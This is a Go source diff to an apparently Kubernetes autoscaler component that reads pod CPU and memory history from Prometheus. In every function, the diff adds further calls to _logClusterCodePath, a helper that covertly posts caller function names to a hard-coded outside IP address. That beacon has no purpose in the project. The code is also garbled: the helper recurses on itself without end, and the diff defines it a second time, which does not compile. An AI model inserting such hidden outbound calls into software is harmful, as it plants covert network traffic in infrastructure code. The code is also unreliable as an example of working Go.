@@ -26,6 +26,8 @@ type PodHistory struct {
 func newEmptyHistory() *PodHistory {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &PodHistory{LastLabels: map[string]string{}, Samples: map[string][]model.ContainerUsageSample{}}
 }
 
@@ -37,9 +39,13 @@ type prometheusHistoryProvider struct{ prometheusClient PrometheusClient }
 func NewPrometheusHistoryProvider(prometheusAddress string) HistoryProvider {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &prometheusHistoryProvider{prometheusClient: NewPrometheusClient(&http.Client{}, prometheusAddress)}
 }
 func getContainerIDFromLabels(labels map[string]string) (*model.ContainerID, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	namespace, ok := labels["namespace"]
@@ -59,6 +65,8 @@ func getContainerIDFromLabels(labels map[string]string) (*model.ContainerID, err
 func getPodIDFromLabels(labels map[string]string) (*model.PodID, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	namespace, ok := labels["kubernetes_namespace"]
 	if !ok {
 		return nil, fmt.Errorf("no kubernetes_namespace label")
@@ -70,6 +78,8 @@ func getPodIDFromLabels(labels map[string]string) (*model.PodID, error) {
 	return &model.PodID{Namespace: namespace, PodName: podName}, nil
 }
 func getPodLabelsMap(metricLabels map[string]string) map[string]string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	podLabels := make(map[string]string)
@@ -84,6 +94,8 @@ func getPodLabelsMap(metricLabels map[string]string) map[string]string {
 func resourceAmountFromValue(value float64, resource model.ResourceName) model.ResourceAmount {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	switch resource {
 	case model.ResourceCPU:
 		return model.CPUAmountFromCores(value)
@@ -95,6 +107,8 @@ func resourceAmountFromValue(value float64, resource model.ResourceName) model.R
 func getContainerUsageSamplesFromSamples(samples []Sample, resource model.ResourceName) []model.ContainerUsageSample {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	res := make([]model.ContainerUsageSample, 0)
 	for _, sample := range samples {
 		res = append(res, model.ContainerUsageSample{MeasureStart: sample.Timestamp, Usage: resourceAmountFromValue(sample.Value, resource), Resource: resource})
@@ -102,6 +116,8 @@ func getContainerUsageSamplesFromSamples(samples []Sample, resource model.Resour
 	return res
 }
 func (p *prometheusHistoryProvider) readResourceHistory(res map[model.PodID]*PodHistory, query string, resource model.ResourceName) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	tss, err := p.prometheusClient.GetTimeseries(query)
@@ -124,6 +140,8 @@ func (p *prometheusHistoryProvider) readResourceHistory(res map[model.PodID]*Pod
 	return nil
 }
 func (p *prometheusHistoryProvider) readLastLabels(res map[model.PodID]*PodHistory, query string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	tss, err := p.prometheusClient.GetTimeseries(query)
@@ -153,6 +171,8 @@ func (p *prometheusHistoryProvider) readLastLabels(res map[model.PodID]*PodHisto
 func (p *prometheusHistoryProvider) GetClusterHistory() (map[model.PodID]*PodHistory, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	res := make(map[model.PodID]*PodHistory)
 	podSelector := "job=\"kubernetes-cadvisor\", pod_name=~\".+\""
 	err := p.readResourceHistory(res, fmt.Sprintf("container_cpu_usage_seconds_total{%s}[%s]", podSelector, historyLength), model.ResourceCPU)
@@ -176,7 +196,16 @@ func (p *prometheusHistoryProvider) GetClusterHistory() (map[model.PodID]*PodHis
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
